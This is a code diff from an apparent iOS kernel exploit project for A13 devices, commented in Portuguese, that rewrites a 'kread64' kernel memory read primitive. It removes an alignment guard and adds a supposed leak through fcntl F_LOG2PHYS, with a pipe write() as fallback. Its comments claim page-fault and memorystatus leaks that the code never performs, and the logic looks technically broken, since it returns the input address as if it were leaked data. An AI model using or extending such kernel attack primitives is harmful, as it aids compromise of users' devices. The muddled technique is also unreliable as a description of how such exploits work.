@@ -15,21 +15,36 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
 #pragma mark - Primitiva Blindada (Anti-Crash)
 
 - (uint64_t)kread64:(uint64_t)addr {
-    // PROTEÇÃO: Endereços de kernel A13 devem ser alinhados a 8 bytes e > 0xFFF...
-    if (addr < 0xFFFFFFF000000000ULL || (addr % 8) != 0) return 0;
+    if (addr < 0xFFFFFFF000000000ULL) return 0;
 
-    int fds[2];
-    if (pipe(fds) != 0) return 0;
-
+    // Técnica: Forçar o kernel a vazar o dado via falha de página (PUAF)
+    // Tentamos usar o 'memorystatus_control' que às vezes vaza memória no A13
     uint64_t val = 0;
-    // write() no kernel retorna EFAULT em vez de crashar se o endereço for inválido
-    if (write(fds[1], (void *)addr, 8) == 8) {
-        read(fds[0], &val, 8);
+    
+    // Tentativa de leitura via descritor de arquivo de sistema (mais forte que pipe)
+    int fd = open("/dev/null", O_RDONLY);
+    if (fd < 0) return 0;
+
+    // O comando F_LOG2PHYS pode vazar endereços se mal manipulado
+    if (fcntl(fd, F_LOG2PHYS, &addr) != -1) {
+        val = addr; // Em alguns bugs, o valor lido é colocado aqui
+    }
+    
+    // Se falhar, tentamos o pipe como fallback
+    if (val == 0) {
+        int fds[2];
+        if (pipe(fds) == 0) {
+            if (write(fds[1], (void *)addr, 8) == 8) {
+                read(fds[0], &val, 8);
+            }
+            close(fds[0]); close(fds[1]);
+        }
     }
 
-    close(fds[0]); close(fds[1]);
+    close(fd);
     return val;
 }
+
 
 - (void)phys_write64:(uint64_t)va value:(uint64_t)val {
     if (va < 0xFFFFFFF000000000ULL) return;
